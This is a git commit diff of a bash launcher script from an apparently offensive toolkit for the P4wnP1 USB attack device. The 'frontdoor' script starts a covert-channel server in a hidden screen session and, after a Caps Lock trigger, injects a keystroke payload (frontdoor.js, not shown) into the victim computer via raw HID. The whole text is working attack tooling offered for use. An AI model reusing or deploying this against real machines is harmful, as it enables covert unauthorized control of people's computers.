2d8f5fbfc61f9731c37214c430c8baf7e986ea45
NightRang3r <shai@exploit.co.il>
2024-01-09 23:25:08 +0200

    Updates

--- RAW HID Attacks/Frontdoor/frontdoor.sh
+++ RAW HID Attacks/Frontdoor/frontdoor.sh
@@ -1,20 +1,19 @@
 #!/bin/bash
 hidraw=$(P4wnP1_cli usb get device raw)
 
+# Check if no raw HID device found
 if [ "$hidraw" = "" ]; then
-        echo "[!] No raw HID device found, aborting";
-        exit
+    echo "[!] No raw HID device found, aborting"
+    exit
 fi
 
-
-echo "[*] Starting hidserver.py for frontdoor covert channel payload..."
-        touch /tmp/device_hid_mouse
-        screen -dmS hidsrv bash -c "cd /usr/local/P4wnP1/scripts/frontdoor; python2 hidserver.py"
-        echo "[+] Type \"screen -d -r hidsrv\" to switch to frontdoor cli"
-
-        P4wnP1_cli hid run -c 'waitLED(CAPS);waitLED(CAPS);waitLED(CAPS);' && P4wnP1_cli hid run -n frontdoor.js &
-
-       
+# Check if hidserver.py is already running
+if ! ps aux | grep '[h]idserver.py' > /dev/null; then
+    echo "[*] Starting hidserver.py for frontdoor covert channel payload..."
+    touch /tmp/device_hid_mouse
+    screen -dmS hidsrv bash -c "cd /usr/local/P4wnP1/legacy/Frontdoor; python2 hidserver.py"
+    echo "[+] Type \"screen -d -r hidsrv\" to switch to frontdoor cli"
+    P4wnP1_cli hid run -c 'waitLED(CAPS);waitLED(CAPS);waitLED(CAPS);' && P4wnP1_cli hid run -n frontdoor.js &
 else
-        echo "[!] Frontdoor covert channel server already running"
+    echo "[!] Frontdoor covert channel server already running"
 fi
